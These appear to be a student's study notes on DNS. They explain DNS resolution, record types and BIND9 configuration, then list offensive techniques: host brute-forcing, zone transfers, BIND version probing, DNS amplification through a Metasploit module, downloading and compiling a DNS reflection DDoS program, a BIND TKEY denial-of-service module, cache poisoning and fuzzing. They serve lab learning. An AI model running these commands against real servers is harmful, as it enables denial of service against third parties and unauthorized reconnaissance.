DNS IN A NUT SHELL
- Your computer tries to resolve domain to IP address
- First it checks /etc/hosts  or C:\Windows\System32\drivers\etc\hosts
- If not, it checks for cached IP address in your ISP.
	- Cached pages remain cached based on TTL or Time To Live
- If ISP does not have cached version, it requests IP address from a root server.
	- Example: F-Root server URL is https://www.isc.org/f-root/
- F Root Name server will not give you IP address of requested domain.
	- instead it gives you ip address of the name server for the domain
	- For example, F root name server will give ns-175.awsdns-21.com for the domain duckduckgo.com
- SOA (Start of Authority)
- SOA for duckduckgo.com is responsible for domains only with that space
- SOA for google.com is ns1.google.com
- .com namespace is authorative for all .com's but not authoritative for .net's
- namespaces are often called zones .
- DNS Resource records - entries in the DNS database
	- A  - Address of host , the IP address. 
	- AAAA  - Address of host, IPV6
	- CName  - canonical name - alias domain name that points to same ip
	- MX  - mail exchanger - the mail server. could be ip address or hostname.
	- NS  - name server - contains name server for zone
	- SOA  - start of authority - 
	- PTR  - Pointer - used for reverse DNS lookups. IE supplying IP address and getting back domain.
	- TXT  - used to add additional information used by administrators in human readable formats.

BIND9

setting up recursion and caching.
https://www.digitalocean.com/community/tutorials/how-to-configure-bind-as-a-caching-or-forwarding-dns-server-on-ubuntu-14-04
vim named.conf.options
>> allow-recursion-on{any;}; 
>> allow-query{any;};

checking dns cache
sudo rndc dumpdb -cache
cat /var/cache/bind/named_dump.db | grep facebook


installing
sudo apt install bind9
cat /etc/bind/named.conf  (config file for bind)

making a new zone
vim named.conf.local
```
zone "mydomain.com"
{
    type master;
    file "/etc/bind/db.mydomain.com";
};
```

making a record
vim db.mydomain.com
```
$TTL 604800@ 
IN SOA mydomain.com root.mydomain.com. (
    2 ; Serial
    604800 ; Refresh
    86400 ; Retry
    2419200 ; Expire
    604800 )

IN A 10.10.10.10
@ IN A 10.10.10.10
@ IN AAAA ::1
@ IN NS ns.mydomain.com.
ns IN A 10.10.10.10
```


$TTL - Time To Live
@ - used to represent zone origin. If $ORIGIN is set, then all @ symbols would be replaced with the $ORIGIN. If no origin is set, it is taken from named.conf name.
Name - Blank spaces are copied from row above
Record Class - Usually IN (Internet) 
Record Type - Type of record, A, NS, AAAA, SOA
Record Data -  Often an IP address or host name. root.mydomain.com is an email address and should be though of as root@mydomain.com
Serial Number - Incremented each time zone file is updated. Common to use the date as the serial number. 

systemctl restart bind9.service

FINDING HOSTS
whois truelinkfinancial.com | grep "Name Servers"

recon-ng to brute force hosts
./recon-ng
modules load recon/domains-hosts/brute_hosts
db insert domains google.com~
run
show hosts 

host command
host domain.com
host 8.8.8.8


nmap for DNS server
nmap 10.0.0.1  - look for port 53
nmap -sU 10.0.0.1 - scans for UDP. DNS uses UDP traffic
nmap -sU 10.0.0.1 -p 53 - scans single port for udp.
nmap -Pn 10.0.0.1 - treats host online, doesn't do ping scans.

dig info

dig @nameserver domainname - queries specific nameserver.
dig @148.72.65.77 facebook.com

Question Section - the original query
Server Section - The IP address of the server you requested for DNS.
Authority Section - Shows the hosts nameserver. returns a glue record.

dig @148.72.65.77 c.ns.facebook.com. - queries facebooks name servers
dig @148.72.65.77 facebook.com MX - digs specific resource record.

chaos 
- stores bind information like metadata.
- we are querying the BIND instance, not DNS
- queries take form of name but uses .bind as tld.
- answers are returned in txt section
dig @$ip version.bind chaos txt
dig @$ip authors.bind chaos txt
dig @$ip ID.bind chaos txt


dig @192.168.56.101 AXFR nsa.gov - zone transfers

python dnsrecon.py -n $ip -d facebook.com
python fierce.py --domain facebook.com

traffic amplification
you spoof an ip address in your DNS request and the DNS server sends the data back to the spoofed IP address.
dig @$ip nsa.gov ANY

metasploit
msfconsole
search dns_amp
use auxiliary/scanner/dns/dns_amp
set DOMAINNAME google.com
set RHOSTS $ip

ddos script
download
wget --user=student --password=student https://www.hackerhousebook.com/files/dnsdrdos.c
gcc dnsdrdos.c -o ddos
./ddos -H
vim dns_servers.txt



DNS Metasploit
search tkey
use auxillary/dos/dns/bind/bind_tkey
set RHOSTS ip


DNSSpoof, DUG SONG
DNSCachePoisoning
Cache Snooping - dig somethingelse.com +norecurse

nmap -sU --script dns-fuzz --script-args timelimit=2h 192.168.56.101 -p 53
